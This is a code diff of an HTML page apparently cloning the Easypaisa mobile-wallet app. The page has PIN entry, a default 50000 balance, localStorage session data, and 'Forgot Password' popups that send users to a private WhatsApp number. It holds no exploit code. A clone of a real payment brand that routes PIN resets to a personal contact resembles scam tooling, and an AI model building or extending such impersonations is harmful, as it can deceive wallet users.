@@ -24,7 +24,7 @@
   </script>
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>easypaisa</title>
+  <title>Easypaisa Clone - Home</title>
 <style>
   @font-face {
     font-family: 'Inter Custom';
@@ -711,7 +711,7 @@
     <button class="proceed-btn" id="proceedBtn" onclick="verifyPin()">Proceed</button>
 
     <div class="forgot-btn-wrap">
-      <button class="forgot-btn" onclick="showPopup('Forgot Password', 'Please contact admin on Whatsapp to reset PIN:<br><strong>0331-5983521</strong>')">Forgot Password</button>
+      <button class="forgot-btn" onclick="showPopup('Forgot Password', 'Please contact admin on Whatsapp to reset PIN:<br><strong>0313-9196058</strong>')">Forgot Password</button>
       <button class="biometric-btn">
         <img src="fingerprint.png" alt="Fingerprint" style="width: 24px; height: 24px; object-fit: contain;">
       </button>
@@ -1078,27 +1078,26 @@ function verifyPin() {
       currentActualBalance = Number(matchedUser.balance || 50000);
 
       matchedUser.senderName = matchedUser.name;
-      // Agar database mein 'account' ya 'phone' jo bhi naam ho, usay yahan set karein
       matchedUser.senderPhone = matchedUser.phone || matchedUser.account || matchedUser.phoneNumber || 'Number not set';
       matchedUser.account = matchedUser.senderPhone;
+      matchedUser.email = matchedUser.email || matchedUser.account || matchedUser.phone;
       
       localStorage.setItem('loggedInUser', JSON.stringify(matchedUser));
       sessionStorage.setItem('isSessionActive', 'true');
       localStorage.setItem('userBalance', currentActualBalance);
-      localStorage.setItem('loggedInUser', JSON.stringify({
-      name: matchedUser.name,
-      phone: matchedUser.phone || matchedUser.account,
-      account: matchedUser.phone || matchedUser.account,
-      balance: matchedUser.balance
-  }));
+      localStorage.setItem('savedUserSetup', JSON.stringify({
+        email: matchedUser.email,
+        name: matchedUser.name,
+        phone: matchedUser.phone || matchedUser.account
+      }));
 
       document.getElementById('pinModalOverlay').classList.remove('active');
       document.getElementById('customKeyboard').classList.remove('show');
       renderUserData(matchedUser);
     } else {
-      let userAccount = '0331-5983521';
+      let userAccount = '03315983521';
       let msgText = encodeURIComponent(`I want to reset PIN, my account number is: ${userAccount}`);
-      let whatsappUrl = `https://wa.me/9203315983521?text=${msgText}`;
+      let whatsappUrl = `https://wa.me/923315983521?text=${msgText}`;
 
       showPopup('Invalid PIN', `
         Incorrect PIN entered!<br>Please try again or contact admin on Whatsapp:
